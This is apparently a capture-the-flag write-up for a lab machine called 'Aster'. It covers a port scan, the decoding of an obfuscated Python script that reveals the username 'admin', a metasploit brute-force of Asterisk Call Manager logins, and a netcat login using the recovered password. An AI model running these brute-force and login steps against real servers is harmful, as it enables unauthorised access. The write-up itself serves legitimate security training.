# Aster

### Aster
Nmap scan shows ports 22,80, 1720, 2000 and 5038 open, in particular `5038/tcp open  asterisk    Asterisk Call Manager 5.0.2` is a remote administration utility for VOIP servers. But I first need a set of valid credentials to access it. The website allows me to download a python script which is already byte-compiled. I decompiled it using a tool called `uncompyle6`, but it seems obfuscated so I asked chatGPT to make it look prettier, and this is the result: <br />

    import pyfiglet

    # Line 1: Render "Hello!!" in ASCII art
    o0OO00 = pyfiglet.figlet_format('Hello!!')
    
    # Line 2: A hex-encoded message
    oO00oOo = '476f6f64206a6f622c2075736572202261646d696e2220746865206f70656e20736f75726365206672616d65776f726b20666f72206275696c64696e6720636f6d6d756e69636174696f6e732c20696e7374616c6c656420696e20746865207365727665722e'
    
    # Line 3: Convert hex to bytes
    OOOo0 = bytes.fromhex(oO00oOo)
    
    # Line 4: Decode as ASCII
    Oooo000o = OOOo0.decode('ASCII')
    
    # Line 5-6: Junk dead code for obfuscation
    if 0:
        i1 * ii1IiI1i % OOooOOo / I11i / o0O / IiiIII111iI
    
    # Line 7: Another hex-encoded string
    Oo = '476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21'
    
    # Line 8: Decode second message
    I1Ii11I1Ii1i = bytes.fromhex(Oo)
    Ooo = I1Ii11I1Ii1i.decode('ASCII')
    
    # Line 9: More fake obfuscation code
    if 0:
        iii1I1I / O00oOoOoO0o0O.O0oo0OO0 + Oo0ooO0oo0oO.I1i1iI1i - II
    
    # Line 10: Print the figlet banner
    print o0OO00

As you can see, there are two hex-encoded strings. If I decode them I get the following strings: 

    Good job, user "admin" the open source framework for building communications, installed in the server.
    Good job reverser, python is very cool!Good job reverser, python is very cool!Good job reverser, python is very cool!
The only thing I get from this is that there's a valid user called `admin`. After doing some research, I found there's a metasploit module I can use to bruteforce logins on asterix:

    use auxiliary/voip/asterisk_login
    set rhosts 10.10.45.134
    set stop_on_success true
    set username admin
    run
![image](https://github.com/user-attachments/assets/f930761f-bed7-4e43-842c-f9fbf4becb6e)<br />
With this credentials I can interact with the asterisk server using netcat: 
    
    Action: Login
    Username: admin
    Secret: abc123
I got stuck here for a long time because after entering the secret I did not press the ‘ENTER’ button 2 times(...).<br />
![image](https://github.com/user-attachments/assets/e47fe79a-0239-4488-9877-dadb244d5a98)<br />

